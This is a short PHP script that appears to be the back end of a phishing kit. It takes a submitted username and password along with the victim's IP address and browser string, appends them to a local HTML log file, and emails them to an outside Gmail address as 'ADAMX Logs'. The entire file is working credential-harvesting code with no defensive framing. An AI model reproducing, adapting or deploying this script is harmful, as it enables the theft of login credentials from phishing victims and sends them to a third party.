<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$e = $_REQUEST['x1'] ;
$p = $_REQUEST['x2'] ;

$f = fopen("par.html", "a"); 
fwrite ($f, 'Username: [<b><font color="#570000">'.$e.'</font></b>] Password: [<b><font color="#57003A">'.$p.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="#" rel=""></a></font></b>]<br>');
fclose($f);

$mesaj = "------------ADAMX--------------

-----------ADAMX Logs-------------
Username : $e
Password : $p
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 

$subject = "ADAMX  LOGS";
mail('houstonwisesmith@gmail.com', $subject, $mesaj);

?>




